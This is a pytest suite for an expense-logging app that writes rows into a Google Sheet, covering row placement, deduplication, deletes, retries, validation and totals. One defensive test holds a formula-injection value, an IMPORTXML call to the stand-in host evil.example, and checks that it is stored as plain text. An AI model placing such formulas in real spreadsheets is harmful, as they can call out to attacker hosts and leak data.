import asyncio
import datetime as dt

import pytest

from app.entries import retry_pending
from app.sheets import COL, GoogleSheet, from_serial
from conftest import entry


def data_rows(sheet):
    return {r: v for r, v in sheet.rows.items() if v[0] is not None}


def test_write_lands_after_last_amount_row(authed):
    e = entry(amount=4.5, notes="Chicken rice")
    r = authed.post("/api/entries", json=e)
    assert r.status_code == 200, r.text
    assert r.json()["status"] == "written"
    row = r.json()["row"]
    assert row == 9  # 7 data rows in 2..8, the last two amount-only
    v = authed.sheet._eval(row)
    assert v[:8] == [-4.5, v[1], "Food", "Yes", "SGD", "Chicken rice", e["id"], "app"]
    assert from_serial(v[1]) == dt.date(2026, 11, 24)
    assert v[COL["Q"]] is True and v[COL["U"]] == -4.5


def test_income_is_positive_and_myr_converts(authed):
    r = authed.post("/api/entries", json=entry(amount=50, direction="income", category="Revenue", currency="MYR", notes="Tuition Rishi"))
    v = authed.sheet._eval(r.json()["row"])
    assert v[0] == 50 and v[4] == "MYR" and round(v[COL["U"]], 4) == round(50 * 0.3115, 4)


def test_retrying_five_times_makes_one_row(authed):
    e = entry()
    for _ in range(5):
        assert authed.post("/api/entries", json=e).json()["status"] == "written"
    assert sum(1 for v in authed.sheet.rows.values() if v[COL["G"]] == e["id"]) == 1


def test_dedupe_uses_the_sheet_not_only_the_ledger(authed):
    """If the ledger lost track (say a restore from backup), column G still prevents a second row."""
    from app.db import connect
    e = entry()
    authed.post("/api/entries", json=e)
    conn = connect()
    conn.execute("DELETE FROM entries")
    conn.commit()
    conn.close()
    r = authed.post("/api/entries", json=e)
    assert r.json()["status"] == "written"
    assert sum(1 for v in authed.sheet.rows.values() if v[COL["G"]] == e["id"]) == 1


def test_formulas_are_copied_when_the_target_row_has_none(client, authed):
    sheet = authed.sheet
    for r in range(9, 41):  # pretend the filled-down formulas stop at row 8
        sheet.rows[r] = [None] * 23
    r = authed.post("/api/entries", json=entry())
    row = r.json()["row"]
    assert row == 9
    assert sheet.rows[9][COL["U"]] == '=IF($E9="SGD", $A9,$A9*MYRtoSGD)'
    assert sheet._eval(9)[COL["U"]] == -4.5


def test_rows_land_right_after_a_manual_sort(authed):
    a = authed.post("/api/entries", json=entry(notes="first")).json()["row"]
    # sort everything by amount, which moves the app row to the top
    authed.sheet.sort_rows(key=lambda v: v[0])
    b = authed.post("/api/entries", json=entry(notes="second")).json()["row"]
    assert b == a + 1  # still after the last used row, nothing overwritten
    notes = [v[COL["F"]] for v in data_rows(authed.sheet).values()]
    assert notes.count("first") == 1 and notes.count("second") == 1


def test_delete_finds_the_row_by_id_after_sorting(authed):
    e1, e2 = entry(notes="keep me"), entry(notes="undo me", amount=9.99)
    authed.post("/api/entries", json=e1)
    authed.post("/api/entries", json=e2)
    authed.sheet.sort_rows(key=lambda v: v[0])  # e2 (-9.99) moves near the top
    before = len(data_rows(authed.sheet))
    r = authed.post(f"/api/entries/{e2['id']}/delete", json={})
    assert r.status_code == 200, r.text
    rows = data_rows(authed.sheet)
    assert len(rows) == before - 1
    assert all(v[COL["G"]] != e2["id"] for v in rows.values())
    assert any(v[COL["G"]] == e1["id"] for v in rows.values())
    # formulas of the rows that moved up still point at their own row
    for r, v in rows.items():
        assert v[COL["U"]] == f'=IF($E{r}="SGD", $A{r},$A{r}*MYRtoSGD)'


def test_delete_refuses_if_the_row_was_changed_by_hand(authed):
    e = entry()
    row = authed.post("/api/entries", json=e).json()["row"]
    authed.sheet.rows[row][0] = -99.0
    r = authed.post(f"/api/entries/{e['id']}/delete", json={})
    assert r.status_code == 409
    assert authed.sheet.rows[row][COL["G"]] == e["id"]


def test_rows_not_made_by_the_app_cannot_be_deleted(authed):
    assert authed.post("/api/entries/00000000-0000-0000-0000-000000000000/delete", json={}).status_code == 404


def test_sheet_failure_queues_and_retries_once(authed):
    e = entry()
    authed.get("/api/meta")  # warm the category cache so the failure hits the write itself
    authed.sheet.fail_next = TimeoutError("slow")
    r = authed.post("/api/entries", json=e)
    assert r.status_code == 202 and r.json()["status"] == "queued"
    assert not any(v[COL["G"]] == e["id"] for v in authed.sheet.rows.values())
    # the server retries from the ledger on its own...
    from app.main import app
    from app.db import connect
    conn = connect()
    conn.execute("UPDATE entries SET updated_at = 0")
    conn.commit()
    conn.close()
    assert asyncio.run(retry_pending(app.state.sheet)) == 1
    # ...and the client's resend after that is a no-op
    assert authed.post("/api/entries", json=e).json()["status"] == "written"
    assert sum(1 for v in authed.sheet.rows.values() if v[COL["G"]] == e["id"]) == 1


def test_full_sheet_is_refused(authed):
    from app import writer
    sheet = authed.sheet
    for r in range(9, 1002):
        sheet.rows[r] = [-1.0] + [None] * 15 + [sheet.formula(c, r) for c in range(16, 23)]
    r = authed.post("/api/entries", json=entry())
    assert r.status_code == 202 and r.json()["retry"] is False and "full" in r.json()["error"]
    assert writer.ROW_LIMIT == 1001


def test_target_row_with_stray_content_is_not_overwritten(authed):
    authed.sheet.rows[9][COL["C"]] = "Food"  # someone typed a category but no amount yet
    r = authed.post("/api/entries", json=entry())
    assert r.status_code == 202
    assert authed.sheet.rows[9][0] is None


def test_validation(authed):
    bad = [entry(amount=0), entry(amount=-3), entry(amount=1.234), entry(category="Nope"),
           entry(currency="USD"), entry(id="not-a-uuid"), entry(notes="x" * 121), entry(direction="sideways")]
    for e in bad:
        assert authed.post("/api/entries", json=e).status_code == 422, e


def test_formula_text_is_stored_as_text():
    cell = GoogleSheet._cell('=IMPORTXML("https://evil.example","//a")')
    assert cell == {"userEnteredValue": {"stringValue": '=IMPORTXML("https://evil.example","//a")'}}
    assert GoogleSheet._cell(-4.5) == {"userEnteredValue": {"numberValue": -4.5}}
    assert GoogleSheet._cell(None) == {}


def test_recent_and_totals(authed):
    e = entry(amount=2.0, notes="Kopi")
    authed.post("/api/entries", json=e)
    body = authed.get("/api/recent?fresh=1").json()
    rows = body["rows"]
    assert rows[0]["id"] == e["id"] and rows[0]["editable"] is True
    assert rows[1]["amount"] == -1.6 and rows[1]["date"] is None and rows[1]["editable"] is False
    t = body["totals"]
    # today 24 Nov: 1.40 + 30 MYR + 2.00; week from Mon 23 Nov adds 12; month adds 4.50; revenue excluded
    today = 1.4 + 30 * 0.3115 + 2.0
    approx = lambda x: pytest.approx(x, abs=0.011)  # noqa: E731
    assert t["today"] == approx(today)
    assert t["week"] == approx(today + 12)
    assert t["month"] == approx(today + 12 + 4.5)
    assert t["income_month"] == approx(166.67 * 0.3115)


def test_meta(authed):
    m = authed.get("/api/meta").json()
    assert m["categories"][:1] == ["Food"] and "Loan" in m["categories"] and "Revenue" in m["categories"]
    grab = next(n for n in m["notes"] if n["notes"] == "Grab")
    assert grab == {"notes": "Grab", "category": "Things", "required": False, "currency": "SGD", "uses": 1}
    authed.post("/api/entries", json=entry(currency="MYR"))
    assert authed.get("/api/meta").json()["last_currency"] == "MYR"


def test_delete_keeps_the_sheet_size_and_ranges():
    """deleteDimension alone shrinks the sheet and the Dashboard's named ranges (ending at row 1001)."""
    from app.sheets import SheetMeta
    g = GoogleSheet.__new__(GoogleSheet)
    g._meta = SheetMeta("2026 Journal", 7, "en_US", "Asia/Kuala_Lumpur")
    reqs = g.delete_requests(598, 1001)
    assert reqs[0] == {"deleteDimension": {"range": {"sheetId": 7, "dimension": "ROWS", "startIndex": 597, "endIndex": 598}}}
    # a blank row goes back in above the last row (row 1000), inside the ranges, which stretch back to 1001
    assert reqs[1] == {"insertDimension": {"range": {"sheetId": 7, "dimension": "ROWS", "startIndex": 999, "endIndex": 1000},
                                           "inheritFromBefore": True}}
    # and gets the Q:W formulas from the row above it
    cp = reqs[2]["copyPaste"]
    assert cp["pasteType"] == "PASTE_FORMULA"
    assert (cp["source"]["startRowIndex"], cp["destination"]["startRowIndex"]) == (998, 999)
    assert (cp["source"]["startColumnIndex"], cp["source"]["endColumnIndex"]) == (COL["Q"], COL["W"] + 1)
    # a grid bigger than the ranges: still restore the ranges, not the grid's end
    assert g.delete_requests(10, 1200)[1]["insertDimension"]["range"]["startIndex"] == 999
    # a smaller grid (the dev copy after old deletes): insert above its own last row
    assert g.delete_requests(10, 995)[1]["insertDimension"]["range"]["startIndex"] == 993


def test_fake_delete_keeps_the_size(authed):
    before = max(authed.sheet.rows)
    e = entry()
    authed.post("/api/entries", json=e)
    authed.post(f"/api/entries/{e['id']}/delete", json={})
    assert max(authed.sheet.rows) == before
    last = authed.sheet.rows[before]
    assert last[COL["U"]] == f'=IF($E{before}="SGD", $A{before},$A{before}*MYRtoSGD)'
